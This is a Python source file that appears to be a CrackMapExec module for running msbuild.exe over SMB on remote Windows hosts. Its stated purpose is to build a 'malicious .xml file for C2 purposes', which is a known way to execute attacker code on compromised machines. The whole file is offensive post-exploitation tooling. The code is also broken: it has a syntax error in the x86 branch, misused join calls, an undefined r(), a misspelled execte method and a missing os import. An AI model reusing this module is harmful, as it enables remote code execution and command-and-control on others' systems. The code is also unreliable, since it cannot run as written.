#!/usr/bin/env python3
# -*- coding: utf-8 -*-

class CMEModule:
    '''
        Executes msbuild to build a malicious .xml file for C2 purposes.
        Module by @lolcatlolcat

    '''
    name = 'msbuild'
    description = 'Launches msbuild on a malicious .xml file'
    supported_protocols = ['smb']
    opsec_safe= False #Does the module touch disk?
    multiple_hosts = True #Does it make sense to run this module on multiple hosts at a time?

    def options(self, context, module_options):
        '''
            FILENAME Name of the .xml file to build
            ARCH Architecture of target system (x86 or x 64)
            VER .NET Version targeted
        '''
        self.filename = 'cme.xml'
        self.arch = ''
        self.ver = 'v4.0.30319'

        if module_options and 'FILENAME' in module_options:
            self.filename = module_options["FILENAME"]

        if module_options and 'ARCH' in module_options:
            self.arch = module_options["ARCH"]

    def on_login(self, context, connection):
        if self.arch == 'x64':
            if os.path.isdir(r(os.environ['WINDIR'] + "Microsoft.NET" + "Framework64")):
                 command = ' '.join(os.environ['WINDIR'], "Microsoft.NET", "Framework64", self.ver, "msbuild.exe", self.filename)
            else:
                print "msbuild doesn't exist or couldn't be found(x64)"

        elif self.arch == 'x86':
            if os.path.isdir(r(os.environ['WINDIR']), "Microsoft.NET", "Framework", self.ver, "msbuild.exe", self.filename)
                command = ' '.join(os.environ['WINDIR'], "Microsoft.NET", "Framework", self.ver, "msbuild.exe", self.filename)
            else:
                print "msbuild doesn't exist or couldn't be found (x86)"
        else:
            print "You need to supply the 'ARCH' command line argument :)"

        connection.execte(command)
        context.log.success("Executed msbuild on" + self.filename)

    #def on_admin_login(self, context, connection):
    #    '''Concurrent. Required if on_login is not present. This gets called on each authenticated connection with Administrative privileges'''
    #    pass

    #def on_request(self, context, request):
    #    '''Optional. If the payload needs to retrieve additonal files, add this function to the module'''
    #    pass